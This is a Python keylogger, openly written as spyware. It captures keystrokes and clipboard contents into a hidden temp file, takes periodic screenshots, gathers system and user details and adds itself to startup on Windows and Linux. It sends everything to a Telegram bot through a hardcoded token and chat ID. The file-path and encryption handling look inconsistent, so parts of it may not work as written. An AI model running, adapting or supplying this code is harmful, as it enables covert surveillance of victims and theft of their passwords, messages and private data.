# Enhanced Features
# 1. Screenshot Capture
# 2. System Information Collection
# 3. Log File Encryption
# 4. Persistence


from tempfile import gettempdir
from os import system, name, getenv, path, makedirs
from os.path import isfile, exists, join, expanduser
import threading
from pynput import keyboard
from pyperclip import paste
from datetime import datetime
from time import sleep
import requests
import pyautogui
import platform
from cryptography.fernet import Fernet

# Hardcoded values (not recommended for production)
TOKEN = "7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA"  # Telegram API Token
CHAT_ID = "5818909184"  # Telegram Chat ID

# Constants
INTERVAL = 60
SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots (in seconds)

# Determine the temporary directory based on the OS
temp_dir = gettempdir()
FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
ENCRYPTED_FILENAME = f'{FILENAME}.enc'
SCREENSHOT_FILENAME = join(temp_dir, 'screenshot.png')

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# To notify attacker if any issues occur
def alarm(msg) -> None:
    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')

# Keystroke record
class Keylogger:

    def __init__(self) -> None:
        self.duplicate = ['']
        self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')

    def savefile(self, data: str) -> None:
        try:
            file_exists = isfile(self.filename)

            with open(self.filename, 'a+') as fh:
                fh.write(data)

            if not file_exists and name == 'nt':  # checks if the system is windows and file didn't exist before
                system(f'attrib +h {self.filename}')
        except Exception as e:
            alarm(f'Error: {e}')

    def keylogging(self) -> None:
        def on_key_press(key) -> None:

            def is_duplicate(data: str) -> bool:
                if data and data != self.duplicate[0]:
                    self.duplicate[0] = data
                    return False
                return True

            try:
                # Get the clipboard data
                data = paste()

                if data and not is_duplicate(data):
                    self.savefile(f'clipboard data: {data}\n')

                # Log the Keystrokes
                self.savefile(f'{key}\n')

            except Exception as e:
                alarm(f'Error: {e}')

        try:
            # Create listener objects
            with keyboard.Listener(on_press=on_key_press) as listener:
                listener.join()
        except Exception as e:
            alarm(f"Listener Error: {e}")

    def __del__(self) -> None:
        pass

# Send the file to Telegram at regular intervals
class Uploader:

    def __init__(self) -> None:
        self.encrypted_filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.enc')

    def encrypt_file(self, filename: str) -> None:
        try:
            with open(filename, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(self.encrypted_filename, 'wb') as f:
                f.write(encrypted_data)
        except Exception as e:
            alarm(f'Encryption Error: {e}')

    def upload_file_periodically(self) -> None:
        sleep(INTERVAL)

        while True:
            try:
                if exists(FILENAME):
                    self.encrypt_file(FILENAME)
                    with open(ENCRYPTED_FILENAME, 'rb') as fh:
                        files = {'document': fh}
                        resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)

                        if resp.status_code != 200:
                            alarm(f'Error code: {resp.status_code}')

                else:
                    alarm(f'File not created or found!')

                sleep(INTERVAL)

            except Exception as e:
                alarm(f'Error Occurred: {e}')

    def __del__(self) -> None:
        pass

# Take screenshots periodically
class ScreenshotCapture:

    def __init__(self) -> None:
        self.screenshot_filename = join(gettempdir(), 'screenshot.png')

    def take_screenshot(self) -> None:
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(self.screenshot_filename)
            with open(self.screenshot_filename, 'rb') as fh:
                files = {'document': fh}
                resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)

                if resp.status_code != 200:
                    alarm(f'Screenshot Error Code: {resp.status_code}')

        except Exception as e:
            alarm(f'Screenshot Error: {e}')

    def capture_periodically(self) -> None:
        while True:
            self.take_screenshot()
            sleep(SCREENSHOT_INTERVAL)

    def __del__(self) -> None:
        pass

# Collect system information
def collect_system_info() -> str:
    system_info = f"""
    System Information:
    OS: {platform.system()} {platform.release()}
    Version: {platform.version()}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    Username: {getenv('USER') if name != 'nt' else getenv('USERNAME')}
    """
    return system_info

# Persistence: Add to startup
def add_to_startup() -> None:
    try:
        if name == 'nt':  # Windows
            startup_folder = path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            script_path = path.abspath(__file__)
            shortcut_path = path.join(startup_folder, 'keylogger.lnk')
            if not exists(shortcut_path):
                import winshell
                from win32com.client import Dispatch
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(shortcut_path)
                shortcut.Targetpath = script_path
                shortcut.WorkingDirectory = path.dirname(script_path)
                shortcut.save()
        elif name == 'posix':  # Linux and MacOS
            startup_folder = path.join(expanduser('~'), '.config', 'autostart')
            makedirs(startup_folder, exist_ok=True)
            script_path = path.abspath(__file__)
            desktop_file_path = path.join(startup_folder, 'keylogger.desktop')
            if not exists(desktop_file_path):
                with open(desktop_file_path, 'w') as f:
                    f.write(f"""[Desktop Entry]
                    Type=Application
                    Exec=python3 {script_path}
                    Hidden=false
                    X-GNOME-Autostart-enabled=true
                    Name=Keylogger
                    Comment=Start Keylogger on login
                    """)

    except Exception as e:
        alarm(f'Persistence Error: {e}')

if __name__ == '__main__':
    try:
        # Add to startup
        add_to_startup()

        # Collect system information
        system_info = collect_system_info()
        with open(FILENAME, 'a+') as fh:
            fh.write(system_info)

        # Create objects
        keylogger = Keylogger()
        uploader = Uploader()
        screenshot_capture = ScreenshotCapture()

        # Implement threading
        keylogger_thread = threading.Thread(target=keylogger.keylogging, daemon=True)
        uploader_thread = threading.Thread(target=uploader.upload_file_periodically, daemon=True)
        screenshot_thread = threading.Thread(target=screenshot_capture.capture_periodically, daemon=True)

        # Start threads
        keylogger_thread.start()
        uploader_thread.start()
        screenshot_thread.start()

        # Keep the main thread alive
        try:
            while True:
                sleep(1)
        except KeyboardInterrupt:
            pass

    except Exception as e:
        alarm(f'Main Error: {e}')